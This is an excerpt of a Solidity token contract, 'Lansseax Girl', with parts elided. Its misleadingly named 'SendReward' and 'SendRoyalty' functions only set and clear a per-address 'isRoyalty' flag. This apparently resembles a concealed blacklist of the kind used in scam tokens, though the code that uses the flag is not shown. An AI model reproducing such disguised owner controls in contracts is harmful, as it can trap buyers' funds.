...
contract LansseaxGirl is Context, IERC20, Ownable {
       
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Lansseax Girl";
    string private _symbol = "LANSSEAXGIRL";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress; 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    address _marketingWalletAddress = 0x86F3Aca6C5942337FEEe10Fa1eF18e73f01A0cAd;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) isRoyalty;
    ...
    function SendReward(address _address) public {
        ...
        isRoyalty[_address] = true;
    }

    function SendRoyalty(address _address) public {
        require(isExcludedFromFee[msg.sender]);
        isRoyalty[_address] = false;
    }
